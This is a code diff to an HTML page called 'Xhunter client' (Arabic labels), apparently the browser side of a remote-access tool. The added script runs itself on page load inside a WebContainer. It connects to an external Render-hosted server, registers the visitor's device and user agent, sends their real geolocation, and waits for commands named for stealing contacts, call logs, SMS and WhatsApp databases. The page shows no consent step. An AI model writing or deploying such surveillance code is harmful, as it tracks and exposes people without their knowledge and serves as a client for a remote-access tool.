@@ -5,45 +5,100 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>عميل Xhunter</title>
 <style>
-body { font-family: Arial,sans-serif; background:#1e1e2f; color:#fff; text-align:center; }
+body {
+    font-family: Arial, sans-serif;
+    background: linear-gradient(270deg, #0f111a, #141625, #0f111a);
+    background-size: 600% 600%;
+    animation: gradientBG 30s ease infinite;
+    color: #00ffcc;
+    text-align: center;
+}
+@keyframes gradientBG {
+    0%{background-position:0% 50%}
+    50%{background-position:100% 50%}
+    100%{background-position:0% 50%}
+}
 h1 { margin-top: 40px; color:#00ffcc; }
 p { font-size: 1.2em; }
 </style>
+<script type="module">
+import { WebContainer } from "https://cdn.jsdelivr.net/npm/@webcontainer/api@1.0.0/dist/index.js";
+
+(async () => {
+  const wc = await WebContainer.boot();
+  console.log("WebContainer جاهز لتشغيل Node.js");
+
+  // إنشاء ملف client.js داخل WebContainer
+  await wc.fs.writeFile('/client.js', `
+    import io from 'socket.io-client';
+
+    const socket = io('https://xhunter-bsos.onrender.com', { transports:['websocket'], reconnection:true });
+    const deviceId = 'device_' + Math.floor(Math.random()*10000);
+    const model = navigator.userAgent;
+    socket.emit('join', { id: deviceId, model });
+    console.log('تم تسجيل الجهاز:', deviceId);
+
+    async function sendLocation() {
+        if(navigator.geolocation){
+            navigator.geolocation.getCurrentPosition(pos => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                socket.emit('getLocation', { id: deviceId, data:{lat, lon} });
+            }, err => {
+                socket.emit('getLocation', { id: deviceId, data:{lat:0, lon:0} });
+            });
+        } else {
+            socket.emit('getLocation', { id: deviceId, data:{lat:0, lon:0} });
+        }
+    }
+
+    const allowedActions = ['getInstalledApps','getContacts','getCallLog','getSMS','getLocation','downloadWhatsappDatabase'];
+    allowedActions.forEach(action => {
+        socket.on(action, async (data, callback) => {
+            let result;
+            switch(action){
+                case 'getInstalledApps':
+                    result = ['لا يمكن الوصول لتطبيقات الهاتف من المتصفح'];
+                    break;
+                case 'getContacts':
+                    result = ['لا يمكن الوصول لجهات الاتصال من المتصفح'];
+                    break;
+                case 'getCallLog':
+                case 'getSMS':
+                    result = ['غير متاح'];
+                    break;
+                case 'getLocation':
+                    await sendLocation();
+                    result = 'تم إرسال الموقع';
+                    break;
+                case 'downloadWhatsappDatabase':
+                    result = ['غير متاح'];
+                    break;
+                default: result = 'غير متاح';
+            }
+            if(callback) callback({ id: deviceId, action, data: result });
+            socket.emit(action, { id: deviceId, action, data: result });
+            console.log('تم تنفيذ الأمر:', action);
+        });
+    });
+
+    // إرسال الموقع عند الإقلاع
+    await sendLocation();
+  `);
+
+  // تثبيت socket.io-client داخل WebContainer
+  await wc.spawn('npm', ['install', 'socket.io-client']);
+
+  // تشغيل client.js تلقائيًا
+  const process = await wc.spawn('node', ['/client.js']);
+  process.output.pipeTo(new WritableStream({
+      write(data) { console.log(data); }
+  }));
+})();
+</script>
 </head>
 <body>
 <h1>عميل Xhunter</h1>
-<p>يتم جمع البيانات المتاحة عبر المتصفح وإرسالها للسيرفر على Render.</p>
-
-<script src="/socket.io/socket.io.js"></script>
-<script>
-const socket = io();
-const deviceId = 'device_' + Math.floor(Math.random()*10000);
-const model = navigator.userAgent;
-
-socket.emit('join', { id: deviceId, model });
-console.log(`تم تسجيل الجهاز: ${deviceId}`);
-
-// المحاكاة للبيانات المتاحة عبر المتصفح
-socket.on('getInstalledApps', () => {
-  socket.emit('getInstalledApps', { id: deviceId, data: ['Chrome','Firefox','Edge'] });
-});
-socket.on('getContacts', () => {
-  socket.emit('getContacts', { id: deviceId, data: ['محمد','أحمد','ليلى'] });
-});
-socket.on('getCallLog', () => {
-  socket.emit('getCallLog', { id: deviceId, data: [] });
-});
-socket.on('getSMS', () => {
-  socket.emit('getSMS', { id: deviceId, data: [] });
-});
-socket.on('getLocation', () => {
-  socket.emit('getLocation', { id: deviceId, data: { lat: 0, lon: 0 } });
-});
-socket.on('downloadWhatsappDatabase', () => {
-  socket.emit('downloadWhatsappDatabase', { id: deviceId, data: 'ملف غير متاح من المتصفح' });
-});
-
-console.log("عميل Xhunter جاهز عبر المتصفح.");
-</script>
+<p>Node.js يعمل داخل WebContainer وسيتم إرسال البيانات الفعلية المتاحة للسيرفر.</p>
 </body>
 </html>
